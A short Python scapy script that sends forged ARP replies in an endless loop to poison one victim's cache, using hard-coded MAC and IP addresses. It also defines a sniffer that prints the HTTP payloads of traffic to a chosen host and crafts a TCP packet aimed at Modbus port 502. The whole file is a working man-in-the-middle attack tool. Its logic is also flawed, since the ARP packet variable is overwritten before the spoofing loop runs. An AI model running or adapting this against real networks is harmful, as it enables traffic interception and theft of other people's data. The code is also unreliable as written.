import scapy.all as sc


packet=sc.Ether(dst='dc:53:60:a6:d5:1f')/sc.ARP(op=2 ,hwdst='dc:53:60:a6:d5:1f' ,hwsrc='dc:0e:a1:35:99:b9' , psrc='10.188.112.30', pdst='10.188.112.41')

def arp_Spoof():    
    while True:  
      sc.send(packet , iface='Wi-Fi') 

# sc.ls(sc.Ether)


packet=sc.IP(dst="1.2.3.4")/sc.TCP(dport=502, options=[("MSS", 0)])

def analyzer(packet:sc.packet):
    if packet.haslayer(sc.IP):
        # print(packet)
        if packet['IP'].dst=='10.159.90.29':
            if packet.haslayer(sc.TCP):
                if packet.haslayer(sc.HTTP):
                    print("the packet destination is 10.159.90.29 ")
                    print("this is his payload",bytes(packet['TCP'].payload))
                    print('\n')
        # if packet['IP'].src=='the ip of the server':
        #     print(packet)


        


arp_Spoof()

# sc.sniff(iface='Wi-Fi',prn=analyzer,store=0,count=10)